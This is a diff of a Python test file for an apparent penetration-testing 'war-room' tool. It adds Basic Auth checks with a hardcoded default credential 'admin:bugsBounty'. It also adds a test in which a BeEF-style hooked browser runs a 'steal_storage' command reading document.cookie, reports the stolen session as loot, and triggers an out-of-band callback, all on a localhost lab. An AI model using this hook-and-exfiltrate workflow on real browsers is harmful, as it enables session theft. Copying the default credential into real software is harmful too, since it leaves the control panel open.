@@ -492,21 +492,53 @@ def test_26_interactive_warroom_session_and_web_ui_api():
     assert out_razor["status"]["verified_count"] >= 4
     assert out_razor["status"]["disproved_count"] == 0 or out_razor["status"]["verified_count"] >= 4
 
-    # Verify live Web War-Room HTTP API endpoints (`/`, `/api/state`, `/api/tools`, `/api/chat`)
+    # Verify HTTP Basic Auth (`admin:bugsBounty` default) + live Web War-Room HTTP API endpoints
+    import base64
+    import urllib.error
+
     httpd, ui_sess = start_warroom_server(host="127.0.0.1", port=0, auto_lab=True, block=False)
     ui_port = httpd.server_address[1]
+    basic_hdr = "Basic " + base64.b64encode(b"admin:bugsBounty").decode()
+    bad_hdr = "Basic " + base64.b64encode(b"admin:wrongpass").decode()
     try:
-        html_doc = urllib.request.urlopen(f"http://127.0.0.1:{ui_port}/", timeout=5).read().decode()
+        # 1) Unauthenticated & wrong-password requests MUST return 401 with WWW-Authenticate header
+        with pytest.raises(urllib.error.HTTPError) as exc_noauth:
+            urllib.request.urlopen(f"http://127.0.0.1:{ui_port}/", timeout=5)
+        assert exc_noauth.value.code == 401
+        assert "Basic" in (exc_noauth.value.headers.get("WWW-Authenticate") or "")
+
+        with pytest.raises(urllib.error.HTTPError) as exc_badauth:
+            urllib.request.urlopen(
+                urllib.request.Request(f"http://127.0.0.1:{ui_port}/api/state", headers={"Authorization": bad_hdr}),
+                timeout=5,
+            )
+        assert exc_badauth.value.code == 401
+
+        # 2) Valid Basic Auth (`admin:bugsBounty`) unlocks SPA, `/api/state`, `/api/telemetry`, `/api/chat`
+        html_doc = urllib.request.urlopen(
+            urllib.request.Request(f"http://127.0.0.1:{ui_port}/", headers={"Authorization": basic_hdr}),
+            timeout=5,
+        ).read().decode()
         assert "#basement-ops" in html_doc
-        state_json = json.loads(urllib.request.urlopen(f"http://127.0.0.1:{ui_port}/api/state", timeout=5).read().decode())
-        assert state_json["status"]["lab_running"] is True
-        chat_req = urllib.request.Request(
-            f"http://127.0.0.1:{ui_port}/api/chat",
-            data=json.dumps({"message": "@ghost report station status", "speaker": "GHOST"}).encode(),
-            headers={"Content-Type": "application/json"},
+
+        state_json = json.loads(
+            urllib.request.urlopen(
+                urllib.request.Request(f"http://127.0.0.1:{ui_port}/api/state", headers={"Authorization": basic_hdr}),
+                timeout=5,
+            ).read().decode()
         )
-        chat_res = json.loads(urllib.request.urlopen(chat_req, timeout=25).read().decode())
-        assert len(chat_res["new_messages"]) >= 2
+        assert state_json["status"]["lab_running"] is True
+        assert len(state_json["crew"]) == 6
+        assert all("stats" in c for c in state_json["crew"])
+
+        # 3) Group chat banter (`@CREW` multi-speaker exchange) & individual `@ghost` banter
+        group_req = urllib.request.Request(
+            f"http://127.0.0.1:{ui_port}/api/chat",
+            data=json.dumps({"message": "Oi crew sound off with station status!", "speaker": ""}).encode(),
+            headers={"Content-Type": "application/json", "Authorization": basic_hdr},
+        )
+        group_res = json.loads(urllib.request.urlopen(group_req, timeout=25).read().decode())
+        assert len(group_res["new_messages"]) >= 3
     finally:
         httpd.shutdown()
         httpd.server_close()
@@ -563,5 +595,103 @@ def test_27_grok_groq_openai_auto_key_routing_and_secret_masking(monkeypatch, tm
         cfg_mod.CFG.update(saved_cfg)
         for env_k in ("XAI_API_KEY", "GROK_API_KEY", "GROQ_API_KEY", "GROQ_MODEL", "BUGHUNTER_MODEL"):
             os.environ.pop(env_k, None)
+
+
+def test_28_web_panel_live_agent_stats_wire_telemetry_and_beef_c2_roundtrip():
+    """Verify live per-agent telemetry, real-time wire feed, OOB self-test, and BeEF C2 zombie execution via Web UI."""
+    import base64
+    from web.warroom_ui import start_warroom_server
+
+    httpd, ui_sess = start_warroom_server(host="127.0.0.1", port=0, auto_lab=True, block=False)
+    ui_port = httpd.server_address[1]
+    base = f"http://127.0.0.1:{ui_port}"
+    auth_hdr = "Basic " + base64.b64encode(b"admin:bugsBounty").decode()
+    try:
+        # 1) Victim hook routes (`/beef/victim`, `/beef/hook.js`, `/beef/beacon`, `/beef/poll`, `/beef/result`, `/beef/loot`)
+        #    work WITHOUT operator Basic Auth so hooked victim browsers connect cleanly!
+        victim_html = urllib.request.urlopen(f"{base}/beef/victim", timeout=5).read().decode()
+        assert "/beef/hook.js" in victim_html
+
+        hook_js = urllib.request.urlopen(f"{base}/beef/hook.js?fid=e2e-xss", timeout=5).read().decode()
+        assert "beacon" in hook_js and "poll" in hook_js
+
+        beacon_res = json.loads(
+            urllib.request.urlopen(
+                urllib.request.Request(
+                    f"{base}/beef/beacon?sid=zombie-e2e-1&fid=e2e-xss",
+                    data=json.dumps({"href": f"{base}/beef/victim", "title": "VulnCorp Treasury", "cookie_len": 48}).encode(),
+                    headers={"Content-Type": "application/json"},
+                ),
+                timeout=5,
+            ).read().decode()
+        )
+        assert beacon_res["ok"] is True
+
+        # 2) Operator queues a BeEF module command from Web Panel (`POST /api/beef/command` with Basic Auth)
+        cmd_res = json.loads(
+            urllib.request.urlopen(
+                urllib.request.Request(
+                    f"{base}/api/beef/command",
+                    data=json.dumps({
+                        "sid": "zombie-e2e-1",
+                        "module": "steal_storage",
+                        "label": "Steal Cookies & Storage",
+                        "js": "({cookies: document.cookie})",
+                    }).encode(),
+                    headers={"Content-Type": "application/json", "Authorization": auth_hdr},
+                ),
+                timeout=5,
+            ).read().decode()
+        )
+        assert cmd_res["ok"] is True
+
+        # 3) Hooked browser polls `/beef/poll`, executes command, posts `/beef/result` + `/beef/loot`
+        polled = json.loads(urllib.request.urlopen(f"{base}/beef/poll?session=zombie-e2e-1", timeout=5).read().decode())
+        assert len(polled["cmds"]) == 1
+        cid = polled["cmds"][0]["id"]
+
+        urllib.request.urlopen(
+            urllib.request.Request(
+                f"{base}/beef/result?session=zombie-e2e-1",
+                data=json.dumps({"id": cid, "output": "{\"cookies\":\"session=cfo-prod-jwt\"}"}).encode(),
+                headers={"Content-Type": "application/json"},
+            ),
+            timeout=5,
+        ).read()
+        urllib.request.urlopen(
+            urllib.request.Request(
+                f"{base}/beef/loot?sid=zombie-e2e-1&fid=e2e-xss",
+                data=json.dumps({"kind": "storage_theft", "data": {"cookies": "session=cfo-prod-jwt"}}).encode(),
+                headers={"Content-Type": "application/json"},
+            ),
+            timeout=5,
+        ).read()
+
+        # 4) Trigger OOB callback test & inspect full unified `/api/state` telemetry + BeEF loot + crew stats
+        urllib.request.urlopen(
+            urllib.request.Request(
+                f"{base}/api/oob/test",
+                data=b"{}",
+                headers={"Content-Type": "application/json", "Authorization": auth_hdr},
+            ),
+            timeout=5,
+        ).read()
+
+        snap = json.loads(
+            urllib.request.urlopen(
+                urllib.request.Request(f"{base}/api/state", headers={"Authorization": auth_hdr}),
+                timeout=5,
+            ).read().decode()
+        )
+        assert snap["status"]["beef_online"] >= 1
+        assert snap["status"]["oob_hits"] >= 1
+        assert any(l["kind"] == "storage_theft" for l in snap["beef"]["loot"])
+        assert any(c["status"] == "EXECUTED" for c in snap["beef"]["command_log"])
+        assert snap["telemetry"]["totals"]["http_requests"] >= 1
+    finally:
+        httpd.shutdown()
+        httpd.server_close()
+        if ui_sess.lab_server:
+            ui_sess.lab_server.stop()
 
 
